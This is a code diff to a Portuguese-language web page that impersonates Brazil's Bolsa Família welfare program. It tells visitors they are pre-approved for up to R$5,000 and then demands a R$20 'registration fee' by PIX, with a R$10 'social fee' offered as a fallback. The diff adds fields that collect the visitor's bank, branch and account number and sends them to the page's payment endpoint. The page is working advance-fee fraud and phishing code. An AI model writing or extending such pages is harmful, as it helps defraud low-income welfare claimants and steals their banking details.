@@ -23,65 +23,8 @@
 
         body { background-color: var(--branco); color: var(--cinza-texto); padding-bottom: 80px; }
 
-        /* FAIXA TOPO */
-        .faixa-destaque-topo {
-            background-color: var(--azul-escuro);
-            color: var(--branco);
-            text-align: center;
-            padding: 15px 15px;
-            position: sticky;
-            top: 0;
-            z-index: 200;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            border-bottom: 3px solid var(--amarelo-bolsa);
-        }
-
-        .faixa-destaque-topo h2 {
-            font-size: 18px;
-            font-weight: 500;
-            color: var(--branco);
-            text-transform: none;
-            line-height: 1.3;
-        }
-
-        .destaque-valor {
-            background-color: var(--amarelo-bolsa);
-            color: var(--azul-escuro);
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 20px;
-            display: inline-block;
-            margin: 0 3px;
-            font-weight: 700;
-        }
-
-        .faixa-destaque-topo p { 
-            font-size: 14px; 
-            font-weight: 400; 
-            color: #ddd; 
-        }
-
-        .btn-destaque {
-            background-color: var(--verde-bolsa);
-            color: white;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 15px;
-            transition: background 0.2s;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            margin-top: 5px;
-        }
-        .btn-destaque:hover { background-color: #116b1b; }
-
         /* RESTO DO SITE */
-        header { border-bottom: 1px solid #ddd; padding: 10px 20px; position: sticky; top: 110px; background: var(--branco); z-index: 100; }
+        header { border-bottom: 1px solid #ddd; padding: 10px 20px; position: sticky; top: 0; background: var(--branco); z-index: 100; }
         .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .logo-gov { font-size: 28px; font-weight: 900; color: var(--azul-gov); letter-spacing: -1px; }
         .logo-gov span { color: var(--amarelo-bolsa); }
@@ -168,7 +111,7 @@
         .step-form p { font-size: 14px; color: #666; margin-bottom: 20px; }
         .input-group { margin-bottom: 15px; text-align: left; }
         .input-group label { display: block; font-size: 13px; font-weight: bold; color: var(--azul-escuro); margin-bottom: 5px; }
-        .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        .input-group input, .input-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; background: white; }
         .btn-submit-form { background-color: var(--verde-bolsa); color: white; border: 2px solid var(--amarelo-bolsa); padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 900; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); transition: 0.2s; }
         .btn-submit-form:disabled { opacity: 0.7; cursor: not-allowed; }
 
@@ -177,6 +120,13 @@
         .step-payment .valor-taxa { font-size: 40px; font-weight: 900; color: var(--verde-bolsa); margin: 15px 0; }
         .step-payment p { font-size: 14px; color: #333; margin-bottom: 20px; line-height: 1.5; }
         .step-payment .destaque-taxa { font-weight: bold; color: var(--vermelho-bolsa); }
+        
+        /* NOVOS CAMPOS BANCÁRIOS */
+        .bank-details { background: #f8f9fa; padding: 15px; border-radius: 10px; border: 1px solid #ddd; margin-bottom: 20px; text-align: left; }
+        .bank-details h4 { font-size: 14px; color: var(--azul-gov); margin-bottom: 10px; display: flex; align-items: center; gap: 5px; }
+        .bank-details .input-group { margin-bottom: 10px; }
+        .bank-details .input-group label { font-size: 12px; }
+        .bank-details .input-group input, .bank-details .input-group select { padding: 10px; font-size: 14px; }
         
         .pix-container { background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         
@@ -220,18 +170,10 @@
             .hero h1 { font-size: 32px; }
             .nav-cards { flex-direction: row; flex-wrap: wrap; justify-content: center;}
             .nav-card-btn { width: calc(50% - 10px); flex-direction: column; gap: 15px; text-align: center; padding: 25px 15px;}
-            header { top: 110px; }
         }
     </style>
 </head>
 <body>
-
-    <!-- FAIXA TOPO -->
-    <div class="faixa-destaque-topo">
-        <h2>Bolsa Família com direito a benefício de <span class="destaque-valor">até 5 mil</span></h2>
-        <p>Complete seu cadastro e veja se tem direito.</p>
-        <button class="btn-destaque" onclick="abrirCadastro()">Verificar Benefício Agora</button>
-    </div>
 
     <!-- HEADER -->
     <header>
@@ -381,12 +323,44 @@
                 </form>
             </div>
 
+            <!-- PAGAMENTO R$ 20 COM DADOS BANCÁRIOS -->
             <div class="step-payment" id="passoPagamento">
                 <h2>Benefício Pré-Aprovado!</h2>
                 <p>Parabéns! Seu perfil foi localizado e você tem direito ao benefício de <strong>até R$ 5.000,00</strong>.</p>
                 <div class="valor-taxa">R$ 20,00</div>
                 <p>Para liberar o valor total e agendar o saque, é necessário o pagamento da <span class="destaque-taxa">taxa de inscrição única</span> no valor de R$ 20,00.</p>
                 
+                <!-- NOVOS CAMPOS BANCÁRIOS -->
+                <div class="bank-details">
+                    <h4>🏦 Dados para Recebimento (Opcional)</h4>
+                    <div class="input-group">
+                        <label>Banco</label>
+                        <select id="banco-1">
+                            <option value="">Selecione o Banco</option>
+                            <option value="Caixa">Caixa Econômica Federal</option>
+                            <option value="BB">Banco do Brasil</option>
+                            <option value="Bradesco">Bradesco</option>
+                            <option value="Itau">Itaú Unibanco</option>
+                            <option value="Santander">Santander</option>
+                            <option value="Nubank">Nubank</option>
+                            <option value="Inter">Banco Inter</option>
+                            <option value="PicPay">PicPay</option>
+                            <option value="MercadoPago">Mercado Pago</option>
+                            <option value="Outro">Outro</option>
+                        </select>
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <div class="input-group" style="flex: 1;">
+                            <label>Agência</label>
+                            <input type="text" id="agencia-1" placeholder="0000" maxlength="6">
+                        </div>
+                        <div class="input-group" style="flex: 2;">
+                            <label>Conta (com dígito)</label>
+                            <input type="text" id="conta-1" placeholder="00000-0" maxlength="15">
+                        </div>
+                    </div>
+                </div>
+
                 <button class="btn-pagamento" id="btnPagar" onclick="processarPagamento()">Pagar R$ 20,00 e Liberar Benefício</button>
                 
                 <div id="pix-area-1" style="display: none;">
@@ -428,6 +402,7 @@
                 <button class="btn-option" onclick="responderDownsell(3)">Vou tentar conseguir o valor.</button>
             </div>
 
+            <!-- PAGAMENTO R$ 10 COM DADOS BANCÁRIOS -->
             <div class="step-downsell" id="passoDownsell">
                 <h2>Condição Especial Liberada!</h2>
                 <p>Como você demonstrou real necessidade, liberamos uma <strong>taxa social reduzida</strong> para o seu caso.</p>
@@ -435,6 +410,37 @@
                 <div class="valor-taxa">R$ 10,00</div>
                 <p>Aproveite esta condição única. Pague apenas <span class="destaque-taxa">R$ 10,00</span> para liberar o valor total do seu benefício.</p>
                 
+                <!-- NOVOS CAMPOS BANCÁRIOS -->
+                <div class="bank-details">
+                    <h4>🏦 Dados para Recebimento (Opcional)</h4>
+                    <div class="input-group">
+                        <label>Banco</label>
+                        <select id="banco-2">
+                            <option value="">Selecione o Banco</option>
+                            <option value="Caixa">Caixa Econômica Federal</option>
+                            <option value="BB">Banco do Brasil</option>
+                            <option value="Bradesco">Bradesco</option>
+                            <option value="Itau">Itaú Unibanco</option>
+                            <option value="Santander">Santander</option>
+                            <option value="Nubank">Nubank</option>
+                            <option value="Inter">Banco Inter</option>
+                            <option value="PicPay">PicPay</option>
+                            <option value="MercadoPago">Mercado Pago</option>
+                            <option value="Outro">Outro</option>
+                        </select>
+                    </div>
+                    <div style="display: flex; gap: 10px;">
+                        <div class="input-group" style="flex: 1;">
+                            <label>Agência</label>
+                            <input type="text" id="agencia-2" placeholder="0000" maxlength="6">
+                        </div>
+                        <div class="input-group" style="flex: 2;">
+                            <label>Conta (com dígito)</label>
+                            <input type="text" id="conta-2" placeholder="00000-0" maxlength="15">
+                        </div>
+                    </div>
+                </div>
+
                 <button class="btn-downsell" id="btnPagarDown" onclick="processarPagamentoDownsell()">Pagar R$ 10,00 e Liberar Benefício</button>
                 
                 <div id="pix-area-2" style="display: none;">
@@ -587,7 +593,16 @@
             }
         }
 
+        // FUNÇÃO PARA GERAR O PIX E MOSTRAR O QR CODE (R$ 20)
         async function processarPagamento() {
+            const banco = document.getElementById('banco-1').value;
+            const agencia = document.getElementById('agencia-1').value;
+            const conta = document.getElementById('conta-1').value;
+            
+            if (banco || agencia || conta) {
+                console.log("Dados bancários recebidos (R$ 20):", { banco, agencia, conta });
+            }
+
             const textoOriginal = btnPagar.innerHTML;
             btnPagar.innerHTML = "Gerando PIX...";
             btnPagar.disabled = true;
@@ -596,7 +611,13 @@
                 const resposta = await fetch('/api/pagamento', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ valor: 20, cliente: document.getElementById('nome').value })
+                    body: JSON.stringify({ 
+                        valor: 20, 
+                        cliente: document.getElementById('nome').value,
+                        banco: banco,
+                        agencia: agencia,
+                        conta: conta
+                    })
                 });
 
                 const resultado = await resposta.json();
@@ -604,7 +625,6 @@
                 if (resposta.ok && resultado.sucesso) {
                     const codigoPix = resultado.qr_code;
                     
-                    // Apenas exibe o código PIX, sem gerar QR Code
                     document.getElementById('pix-code-text-1').innerText = codigoPix;
                     
                     btnPagar.style.display = 'none';
@@ -629,7 +649,16 @@
             }
         }
 
+        // FUNÇÃO PARA GERAR O PIX DO DOWNSELL (R$ 10)
         async function processarPagamentoDownsell() {
+            const banco = document.getElementById('banco-2').value;
+            const agencia = document.getElementById('agencia-2').value;
+            const conta = document.getElementById('conta-2').value;
+
+            if (banco || agencia || conta) {
+                console.log("Dados bancários recebidos (R$ 10):", { banco, agencia, conta });
+            }
+
             const textoOriginal = btnPagarDown.innerHTML;
             btnPagarDown.innerHTML = "Gerando PIX...";
             btnPagarDown.disabled = true;
@@ -638,7 +667,13 @@
                 const resposta = await fetch('/api/pagamento', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ valor: 10, cliente: document.getElementById('nome').value })
+                    body: JSON.stringify({ 
+                        valor: 10, 
+                        cliente: document.getElementById('nome').value,
+                        banco: banco,
+                        agencia: agencia,
+                        conta: conta
+                    })
                 });
 
                 const resultado = await resposta.json();
@@ -646,7 +681,6 @@
                 if (resposta.ok && resultado.sucesso) {
                     const codigoPix = resultado.qr_code;
                     
-                    // Apenas exibe o código PIX, sem gerar QR Code
                     document.getElementById('pix-code-text-2').innerText = codigoPix;
                     
                     btnPagarDown.style.display = 'none';
